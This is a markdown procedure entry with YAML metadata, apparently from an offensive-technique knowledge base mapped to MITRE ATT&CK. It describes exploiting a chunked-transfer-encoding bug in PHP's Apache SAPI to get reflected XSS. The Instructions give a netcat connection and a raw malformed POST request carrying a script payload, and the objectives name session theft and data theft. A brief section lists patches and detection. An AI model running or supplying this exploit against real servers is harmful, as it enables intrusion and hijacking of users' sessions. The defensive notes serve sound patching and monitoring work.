---
id: proc-send-chunked-xss
name: Send-Crafted-Chunked-POST-Request-with-XSS-Payload
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:31.878Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - xss
  - chunked-encoding
  - php
commands:
  - '[[commands/nc-connect-http]]'
  - '[[commands/send-chunked-xss-request]]'
platforms:
  - Web
tools:
  - '[[tools/Netcat]]'
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Send-Crafted-Chunked-POST-Request-with-XSS-Payload

## Summary

This procedure crafts and sends a malformed chunked transfer encoding POST request to a PHP-enabled Apache server, embedding an XSS payload after the chunk size indicator to exploit mishandling in sapi_apache2.c, causing the payload to be appended to the server's 400 Bad Request response.

## Description

The vulnerability arises from improper brigade bucket management in PHP's Apache SAPI module. When a chunked request with a mismatched Content-Length is sent, the payload following the chunk size (e.g., '12<script>alert(1)</script>') is not properly consumed and gets inserted into the response brigade via APR_BRIGADE_INSERT_TAIL, leading to reflected XSS on any endpoint. This affects Apache/2.4.33 with PHP/7.1.17, allowing attackers to inject HTML/JS for session hijacking or data theft without authentication.

## Requirements

1. Network access to target on port 80
2. Netcat installed for raw TCP connections
3. Target running vulnerable Apache-PHP stack

## Defense

Defensive measures and detection strategies:

- Upgrade PHP to version 7.1.18+ or apply patches for brigade handling
- Enable mod_security with rules to detect malformed chunked requests
- Monitor Apache logs for 400 errors with anomalous response sizes

## Objectives

1. Trigger the chunked encoding parsing flaw to inject XSS
2. Confirm payload delivery in response brigade
3. Enable follow-on attacks like session theft

## Instructions

### Step 1: Establish TCP Connection

**Context**: Connect to the target's HTTP port using Netcat to send raw requests.

**Command** ([[commands/nc-connect-http]]):
```bash
nc localhost 80
```

> This opens an interactive session to input the HTTP request. Replace 'localhost' with the target IP if remote. Expected: Prompt for input without errors.

### Step 2: Send Malformed Chunked Request

**Context**: Input the crafted POST request with Transfer-Encoding: chunked, mismatched Content-Length: 25, and payload after chunk size '12' to exploit the bug.

**Command** ([[commands/send-chunked-xss-request]]):
```bash
POST /lol.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/json\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nTransfer-Encoding: chunked\nContent-Length: 25\n\n12<script>alert(1)</script>
```

> This sends the request; the payload bypasses parsing and appends to the response. Expected: Server sends back 400 response with injected script.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/nc-connect-http]]
- [[commands/send-chunked-xss-request]]

## Tools Used

- [[tools/Netcat]]

## Tags

- [[xss]]
- [[chunked-encoding]]
